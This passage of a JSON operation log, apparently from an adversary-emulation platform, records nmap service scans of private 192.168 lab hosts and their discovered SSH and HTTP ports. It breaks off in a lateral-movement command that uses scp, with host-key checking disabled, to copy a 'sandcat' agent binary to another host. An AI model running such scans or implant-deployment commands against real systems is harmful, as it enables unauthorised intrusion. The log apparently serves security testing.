{"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:47:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4994b20>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4997310>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:47:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:47:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4995c90>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4996b00>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:47:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:47:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4cb84f0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4cb96f0>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:47:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:47:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4cba140>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4cb8f40>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:47:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:47:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456d4e0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456fa90>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:47:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:47:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.200.3,4,5", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.200.3,4,5", "created": "2024-04-26T23:47:32Z", "score": 7, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "8298a844-4082-4e7f-ac12-669a6fd9deef", "collect": "2024-04-26T23:47:33Z", "finish": "2024-04-26T23:47:40Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:47:33Z"}, {"id": "7e5ca019-19a9-4aae-986e-8aed3805f52a", "paw": "etrrtg", "command": "nmap -sV --version-light -oX - 192.168.201.2,3,4,5,6,82,90", "plaintext_command": "nmap -sV --version-light -oX - 192.168.201.2,3,4,5,6,82,90", "status": 0, "score": 1, "decide": "2024-04-26T23:47:42Z", "pin": 0, "pid": "1232", "facts": [{"unique": "host.remote.ip192.168.201.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.3", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "007336c1-5bd0-4984-8a61-e7ccc05b3401", "de63325b-25ae-453b-84d1-860a8e4f7eef", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.4) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.5) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.202.3) : has_open_ports : host.remote.ports(['22'])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.201.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.4", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.4) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.4) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.201.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.5", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.5) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.5) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.201.6", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.6", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.6) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.201.82", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.82", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.82) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.82) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["czljvk", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.82) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.90) : has_open_ports : host.remote.ports(['22', '8080'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.201.90", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.90", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.90) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.90) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["czljvk", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "007336c1-5bd0-4984-8a61-e7ccc05b3401", "de63325b-25ae-453b-84d1-860a8e4f7eef", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.201.4) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.201.5) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.201.6) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.202.3) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.82) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.90) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4cbb070>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4cba620>", "source": {"unique": "host.remote.ip192.168.201.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.3", "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479c0a0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479f9a0>", "source": {"unique": "host.remote.ip192.168.201.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.4", "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4665ab0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4664e50>", "source": {"unique": "host.remote.ip192.168.201.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.5", "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4667790>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf486dc00>", "source": {"unique": "host.remote.ip192.168.201.6", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.6", "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf486cc10>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf486ce20>", "source": {"unique": "host.remote.ip192.168.201.82", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.82", "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456fc40>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456cc10>", "source": {"unique": "host.remote.ip192.168.201.90", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.90", "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456ed10>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456cdf0>", "source": {"unique": "host.remote.ip192.168.201.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.3", "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456f9a0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456f760>", "source": {"unique": "host.remote.ip192.168.201.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.4", "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456c460>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456ce50>", "source": {"unique": "host.remote.ip192.168.201.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.5", "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456d720>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456d6c0>", "source": {"unique": "host.remote.ip192.168.201.6", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.6", "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456feb0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456df00>", "source": {"unique": "host.remote.ip192.168.201.82", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.82", "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456cac0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456ce20>", "source": {"unique": "host.remote.ip192.168.201.90", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.90", "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:47:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.201.2,3,4,5,6,82,90", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.201.2,3,4,5,6,82,90", "created": "2024-04-26T23:47:42Z", "score": 13, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "7e5ca019-19a9-4aae-986e-8aed3805f52a", "collect": "2024-04-26T23:47:45Z", "finish": "2024-04-26T23:47:52Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:47:45Z"}, {"id": "0a50b86c-cd63-48e2-b97a-337f8ade68bc", "paw": "dagwxr", "command": "scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux employeeB@192.168.201.4:~/sandcat.go && ssh -p 22 -o 